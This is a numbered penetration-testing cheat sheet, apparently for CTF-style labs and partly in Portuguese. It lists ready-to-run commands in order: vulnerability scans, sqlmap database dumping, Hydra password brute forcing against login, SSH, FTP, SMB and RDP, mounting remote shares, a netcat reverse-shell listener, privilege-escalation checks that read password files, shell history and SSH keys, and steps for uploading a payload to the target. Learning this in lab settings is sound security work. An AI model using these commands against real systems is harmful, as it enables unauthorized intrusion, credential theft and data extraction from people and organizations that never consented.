# 1° Scan Nmap 

$sudo nmap -Pn -A [Target_IP] -oN report-nmap.txt

$sudo nmap -Pn -sV -sC -O [Target_IP] -oN report-nmap.txt

$sudo nmap -Pn --script vuln [Target_IP]

$sudo nmap -Pn -p 80 --script http-enum,http-robots.txt [Target_IP]

$sudo nmap -Pn -p 80 --script http-sql-injection [Target_IP]

$sudo nmap -Pn -p 80 --script http-passwd --script-args http-passwd.root=/test/ [Target_IP]

$sudo nmap -Pn -p 80 --script http-vuln-* [Target_IP]

$sudo nmap -Pn -p 21 --script ftp-anon [Target_IP]

$sudo nmap -Pn -p 21 --script ftp-proftpd-backdoor [Target_IP] - ProFTPD 1.3.3c

$sudo nmap -Pn -p 21 --script ftp-vsftpd-backdoor [Target_IP] - vsFTPd 2.3.4

#nmap -Pn -p 111 --script nfs-ls,nfs-statfs,nfs-showmount [Target_IP]

#nmap -Pn -p 445 --script smb-enum-shares,smb-enum-users [Target_IP]

#nmap -Pn -p 445 --script smb-vuln-* [Target_IP]

https://www.exploit-db.com

# 2° Scan Dirb/Gobuster

$dirb http://Target_IP -o dirb-report.txt

$dirb http://Target_IP -x file-ext.txt -w /usr/share/dirb/wordlists/common.txt -o dirb-report.txt

$dirb http://Target_IP:8080 -w /usr/share/dirb/wordlists/common.txt -u user:password

$gobuster -u http://Target -x php,html,js,txt,zip -w /usr/share/dirb/wordlists/big.txt dir

# 3° Scan SQLMap/Nikto/Burp Suite/ZAP

$sqlmap -u http://Target_IP/login.php --forms --dump

$sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs

$sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables

$nikto -h http://Target_IP:8080/ -id user:password

Burp Suite > Proxy > Intercept > Open Browser > Intercept on

Burp Suite > Intruder > Sniper attack > Positions Add > Payload Type = Simple list

# 4° Brute Force

$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"

$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp

$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ssh

$hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP smb

$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP rdp

$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -s 8080 http-get  

# 5° Scan SMB

$enum4linux -a Target_IP | tee enum4linux.log

# 6° Gain Access

http://example.com/login [Exibir código fonte da página]

http://example.com/ftp

http://example/upload

http://example.com/hiden/dir

http://example.com/robots.txt

$ftp Target_IP

$ssh user@Target_IP

$ssh -i id_rsa user@Target_IP

$ssh -oHostKeyAlgorithms=+ssh-rsa user@Target_IP

$sudo mount -o rw Target_IP:/backup /tmp/dir-target

$sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-target

$smbclient //Target_IP/shared/dir

# 7° Reverse Shell

Execute no terminal shell do Kali Linux $nc -lvnp 6666

php, python, nc

https://github.com/pentestmonkey/php-reverse-shell

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://www.sans.org/posters/netcat-cheat-sheet

# 8° Search Priv-Esc

$cat /etc/proc/version

$cat /etc/issue

$cat /etc/passwd

$cat /etc/crontab

$cat /etc/exports

$cat ~/.*history | less

$id

$ls -la /

$ls -la /home

$ls -la /home/user/.ssh

$sudo -l

$getcap -r / 2>/dev/null

$find / -perm -o w -type d 2>/dev/null

$find / -perm -u=s -type f 2>/dev/null

$find / -name perl* python* gcc* 2>/dev/nul

$find /home -name flag*.txt

$find / -user "www-data" -name "*" 2>/dev/null

https://gtfobins.github.io

https://www.exploit-db.com

# 9° Deploy Payload

$python2 -m SimpleHTTPServer 8000

$python3 -m http-server 8000

$scp payload.sh user@Target_IP:/home/user
